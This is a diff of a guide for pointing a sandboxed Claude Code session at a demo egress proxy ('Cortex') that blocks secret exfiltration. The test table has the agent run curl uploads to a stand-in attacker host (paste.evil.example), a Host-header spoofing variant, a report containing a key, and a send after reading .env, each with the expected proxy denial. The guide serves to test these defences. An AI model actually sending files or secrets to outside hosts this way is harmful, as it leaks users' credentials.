@@ -1,24 +1,25 @@
-# Running real Claude Code
+# Use Claude Code with the demo
 
-The scripted scenarios run a stand-in agent under `srt`. This guide points a
-real, sandboxed Claude Code session at the same demo cortex and policy.
-Claude Code's own sandbox sends every command's traffic to cortex, and
-nothing the model does changes that.
+This guide connects Claude Code to the demo's Cortex instance and policy.
+Sandboxed commands send their network traffic through Cortex. Model calls
+and WebFetch use the proxy settings described below.
 
-## What goes through cortex
+## What goes through Cortex
 
-| Traffic | Route | Status |
+| Traffic | Route | Coverage |
 |---|---|---|
-| Sandboxed Bash and its children (`curl`, `git`, `npm`) | `sandbox.network.httpProxyPort` → `:47700` | **enforced**: the OS sandbox leaves no other route |
-| Claude Code's own process: model API, WebFetch | `HTTPS_PROXY` → `:47700` | **monitored**: honoured by the process, not enforced |
-| Read, Edit, Write, local MCP servers, hooks | none | outside both |
+| Sandboxed Bash and its children (`curl`, `git`, `npm`) | `sandbox.network.httpProxyPort` → `:47700` | Enforced: commands have no other network route |
+| Claude Code's model calls and WebFetch | `HTTPS_PROXY` → `:47700` | Routed through Cortex while the process respects the proxy setting |
+| Read, Edit, Write, local MCP servers, and hooks | No direct interception | Execution is outside the sandbox and Cortex's traffic inspection |
 
-The second row matters even though it is not enforced. The model calls carry
-the tool results, which is how reading `.env` taints the session; they must
-reach the demo cortex, not an installed service on `:47600`, or the taint and the
-sandboxed `curl` land in different places.
+Model calls include tool results. When a result contains a recognized
+secret, policy marks the session as having read it ("tainted"). Route model
+calls and sandboxed commands to the same demo Cortex instance so they share
+that session state.
 
 ## Run it
+
+Run these commands from `demos/coding-agent-cpex`:
 
 ```sh
 ./run.sh up --claude-code               # adds the model API and registry/VCS hosts
@@ -26,84 +27,87 @@ claude-code/setup.sh settings           # writes .state/claude-code/settings.jso
 cd .state/workspace && claude --settings ../claude-code/settings.json
 ```
 
-Say anything to Claude Code so it makes a model call, then, in another
-terminal:
+Send a message to Claude Code, then run this from the demo directory in
+another terminal:
 
 ```sh
 claude-code/setup.sh wait
 ```
 
-It refuses to continue until the demo session API holds a session that
-Claude Code opened, whose model call went to `api.anthropic.com` and got a
-200 back. Until then, nothing below says anything about Claude Code. Set
-`CLAUDE_INFERENCE_HOST` if you use a gateway.
+The command waits until Cortex records a successful model call (200) from
+Claude Code to `api.anthropic.com`. Set `CLAUDE_INFERENCE_HOST` if you use a
+gateway. This confirms that model calls reach the demo instance.
 
-Then ask Claude Code to run these from the workspace, in this order (the
-last one taints the session):
+Ask Claude Code to run these from the workspace in order. The last step
+marks the session as having read a secret.
 
 | Ask it to run | Expect |
 |---|---|
 | `curl -sS --data-binary @report-clean.json https://paste.evil.example/upload` | `CONNECT tunnel failed, response 403` |
 | the same with `-H 'Host: support.localtest.me'` | `CONNECT tunnel failed, response 403` |
-| `curl -sS -H 'Content-Type: application/json' --data-binary @report-clean.json https://support.localtest.me:47711/projects/A/reports` | 201 |
+| `curl -sS -H 'Content-Type: application/json' --data-binary @report-clean.json https://support.localtest.me:47711/projects/A/reports` | Accepted (201) |
 | the same with `@report-with-key.json` | 403 `cpex.secret_in_body` |
 | the clean report to `/projects/B/reports` | 403 `cpex.project_not_authorized` |
 | read `.env`, then send the clean report to project A again | 403 `cpex.session_tainted_secret` |
 
-The model may decline some of these on its own. That is the model's choice,
-not enforcement; ask for the exact command. Each decision is on the
-session's timeline: `curl -s "http://127.0.0.1:47701/v1/sessions/<id>" | jq`.
+If the model declines a command, the proxy has not been tested. Request the
+exact command and check Cortex's decision on the session timeline:
+
+```sh
+curl -s "http://127.0.0.1:47701/v1/sessions/<id>" | jq
+```
 
 ## What the settings do
 
-[`settings.json.example`](settings.json.example) is rendered with this
-directory's absolute path. Key names follow
-<https://code.claude.com/docs/en/sandboxing>.
+The setup script fills in absolute paths in
+[`settings.json.example`](settings.json.example). See the
+[Claude Code sandboxing documentation](https://code.claude.com/docs/en/sandboxing)
+for the setting names.
 
 - `sandbox.enabled`, `failIfUnavailable`, `allowUnsandboxedCommands: false`:
-  commands run sandboxed or not at all; no unsandboxed retry.
+  require sandboxed commands and disable retries outside the sandbox.
 - `sandbox.network.httpProxyPort` and `socksProxyPort`: both to `:47700`.
-  Once a port is set, Claude Code's own domain lists stop applying, and the
-  demo policy holds the allowlist. Setting only one would leave Claude Code's
-  other proxy running. Cortex does not speak SOCKS, so SOCKS clients fail.
-- `env.HTTPS_PROXY`, `HTTP_PROXY`: the Claude Code process itself.
-- `NODE_EXTRA_CA_CERTS` (the bridge CA; Node adds it) and `SSL_CERT_FILE`,
-  `CURL_CA_BUNDLE`, `GIT_SSL_CAINFO`, `REQUESTS_CA_BUNDLE` (`bundle.crt`, the
-  bridge CA plus system roots, since these replace the trust store). Go
-  programs on macOS ignore `SSL_CERT_FILE`; `gh` and similar fail TLS unless
+  This moves the host allowlist to the demo policy. Both ports must be set
+  to prevent Claude Code from running its other proxy. Cortex does not
+  support SOCKS, so SOCKS clients fail.
+- `env.HTTPS_PROXY`, `HTTP_PROXY`: route Claude Code's own requests through
+  Cortex.
+- `NODE_EXTRA_CA_CERTS`: adds the bridge CA to Node's trust store.
+  `SSL_CERT_FILE`, `CURL_CA_BUNDLE`, `GIT_SSL_CAINFO`, and
+  `REQUESTS_CA_BUNDLE` use `bundle.crt`, containing the bridge CA and system
+  roots, because these settings replace the trust store. Go programs on
+  macOS ignore `SSL_CERT_FILE`; `gh` and similar tools fail TLS unless
   `sandbox.enableWeakerNetworkIsolation` is set.
 - `filesystem.denyRead` and `credentials` `deny` entries: the sandbox cannot
   read the developer identity, the mocks' CA, the bridge CA key or the
-  support token, and `SUPPORT_TOKEN` is unset. No support credential is
-  present in the sandbox.
+  support token. `SUPPORT_TOKEN` is also unset.
 - `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC`: keeps telemetry hosts off the
   allowlist.
 
-Pass the file with `--settings`, not as `.claude/settings.local.json`:
-Claude Code ignores `credentials` entries in project and local settings.
+Pass the generated file with `--settings`. Claude Code ignores `credentials`
+entries in project and local settings, including `.claude/settings.local.json`.
 
 ## Hosts
 
-`--claude-code` adds `api.anthropic.com` to the policy's allowlist (bridged,
-so model calls are checked), and lists package registries and VCS hosts as
-allowed and tunnelled unopened, so installs and clones work and are not
-buffered by cpex. Change them with `CLAUDE_CODE_LLM_HOSTS` and
-`CLAUDE_CODE_PASSTHROUGH_HOSTS`. A tunnelled host is an allowed destination
-whose content cortex never sees: a tainted session can still push to it.
-Any other host is refused as `cpex.egress_host_not_allowed`.
+`--claude-code` allows and inspects model calls to `api.anthropic.com`.
+It also allows package registries and source control hosts as passthrough
+destinations: Cortex does not decrypt, inspect, or buffer their traffic.
+A tainted session can still push to a passthrough host.
+
+Set `CLAUDE_CODE_LLM_HOSTS` and `CLAUDE_CODE_PASSTHROUGH_HOSTS` to change
+these lists. Other hosts are blocked with `cpex.egress_host_not_allowed`.
 
 ## In a real deployment
 
-Settings a developer or repository can edit are not a boundary. Deliver the
-sandbox keys and the proxy port through managed settings, with
-`sandbox.network.allowManagedDomainsOnly: true`, which leaves managed
-settings the only place a proxy port can be set. Claude Code ignores port
-settings anywhere else once that lock is on.
+Enforce sandbox and proxy configuration through managed settings. Set
+`sandbox.network.allowManagedDomainsOnly: true` so Claude Code accepts proxy
+ports only from managed settings. Settings editable by a developer or
+repository do not enforce this restriction.
 
-## Caveats
+## Limits
 
-- The `.env` contents go to the model provider and onto the demo cortex's
+- The `.env` contents go to the model provider and onto the demo Cortex's
   session timeline. The key in the fixture is AWS's documented example.
-- Taint resets when the demo cortex restarts.
+- Session taint resets when the demo Cortex restarts or reloads its config.
 - The workspace sits inside this repository, so Claude Code also loads the
   repository's `CLAUDE.md`.
